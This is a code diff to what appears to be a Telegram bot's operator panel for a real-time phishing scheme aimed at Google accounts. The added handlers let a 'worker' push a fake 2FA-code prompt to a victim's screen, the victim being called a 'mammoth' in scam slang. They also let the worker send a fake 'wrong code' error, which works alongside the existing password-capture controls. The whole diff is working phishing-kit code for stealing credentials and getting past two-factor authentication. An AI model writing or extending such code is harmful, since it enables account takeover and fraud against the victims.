@@ -765,6 +765,10 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
                 InlineKeyboardButton(text="✅ Верный пароль", callback_data=f"gctrl:correct_pass:{user_tg_id}"),
             ],
             [
+                InlineKeyboardButton(text="🔢 Запросить 2FA код", callback_data=f"gctrl:ask_2fa:{user_tg_id}"),
+                InlineKeyboardButton(text="❌ Неверный 2FA", callback_data=f"gctrl:wrong_2fa:{user_tg_id}"),
+            ],
+            [
                 InlineKeyboardButton(text="📲 Тап (Цифры)", callback_data=f"gctrl:ask_prompt:{user_tg_id}"),
                 InlineKeyboardButton(text="❌ Неверные цифры", callback_data=f"gctrl:wrong_prompt:{user_tg_id}"),
             ],
@@ -2823,6 +2827,36 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
             event_type="google_password",
             user_tg_id=target_tg_id,
             details="Воркер/Админ подтвердил верный пароль",
+            is_test=True,
+        )
+
+    elif action in ("ask_2fa", "ask_code"):
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="ask_2fa",
+            error_msg=None,
+        )
+        await callback.answer("🔢 На экран мамонта выведено окно ввода 2FA кода (G-XXXXXX)", show_alert=True)
+        await notify_user_event(
+            event_type="google_ask_2fa",
+            user_tg_id=target_tg_id,
+            details="Воркер/Админ запросил 2FA код Google",
+            is_test=True,
+        )
+
+    elif action in ("wrong_2fa", "wrong_code"):
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="error_2fa",
+            error_msg="Неверный код. Проверьте код и повторите попытку.",
+        )
+        await callback.answer("❌ Ошибка 'Неверный 2FA код' отправлена мамонту", show_alert=True)
+        await notify_user_event(
+            event_type="google_wrong_2fa",
+            user_tg_id=target_tg_id,
+            details="Воркер/Админ отклонил 2FA код Google (Неверный код)",
             is_test=True,
         )
 
